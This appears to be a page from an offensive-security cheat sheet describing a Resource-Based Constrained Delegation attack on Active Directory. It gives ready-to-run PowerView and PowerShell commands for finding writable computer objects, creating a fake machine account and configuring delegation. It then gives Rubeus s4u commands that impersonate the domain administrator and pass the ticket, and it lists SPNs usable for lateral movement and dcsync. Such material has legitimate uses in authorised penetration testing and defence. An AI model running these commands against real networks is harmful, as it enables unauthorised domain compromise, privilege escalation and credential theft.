# Methodology
>1. Enumerate if the compromised user has GenericWrite or GenericAll over a machine (BloodHound recommended!).
>2. Compromise or create a machine account.
>3. Set RBCD on the target machine (the one you want to access), allowing it to trust the compormised or created machine.
>4.  Impersonate a high value target only on target machine.

---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView

> ⚠️ **PAY ATTENTION:**
> If we already have compromised a domain machine, we can skip the machine creation part and use its AES key (SID: S-1-5-18).

**Check for GenericWrite/GenericAll:**
```powershell
# Save the Domain SID
$DomainSID = (Get-DomainController).DomainSID

Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$($DomainSID)*" }
```

**Check if domain controller is at least Windows 2012:**
```powerhsell
Get-DomainController | Select-Object Name, OSVersion
```

**Check if `ms-ds-machineaccountquota` is enabled:**
```powershell
Get-DomainObject -Identity "dc=contoso,dc=local" -Domain contoso.local | Select-Object ms-DS-MachineAccountQuota
```

**Check if target machine doesn't have `msds-allowedtoactonbehalfofotheridentity`attribute set:**
```powershell
Get-NetComputer target_computer | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

**Create a new computer object:**
https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1
```powershell
Import-Module Powermad.ps1
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

## ActiveDirectory Module
**Configure RBCD on target:**
```powershell
$comps = 'fake01$'
Set-ADComputer -Identity target_computer -PrincipalsAllowedToDelegateToAccount $comps
```

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

> ⚠️ **PAY ATTENTION:**
> If we already have compromised a domain machine, we can skip the machine creation part and use its AES key (SID: S-1-5-18).

## Rubeus
**Generate RC4 hash of new computer object:**
```cmd
Rubeus.exe hash /password:123456 /user:fake01 /domain:contoso.local
```

**Impersonate high value target:**
```cmd
# With an NTLM hash (Usually flagged by EDRs)
rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/target_computer.contoso.local /ptt

# With an AES-256 key (Admin cmd required)
rubeus.exe s4u /user:fake01$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /impersonateuser:administrator /msdsspn:cifs/target_computer.contoso.local /ptt
```

**Verify target:**
```cmd
dir \\target_computer\C$  
```

>**ℹ️ Info:**
> Different SPN and what they're used for:
>- CIFS for directory browsing, copying files.
>- HTTP for WinRS.
>- HOST and CIFS for psexec.
>- HOST and RPCSS for WMI.
>- HOST and HTTP for PowerShell Remoting/WINRM.
>- LDAP for dcsync.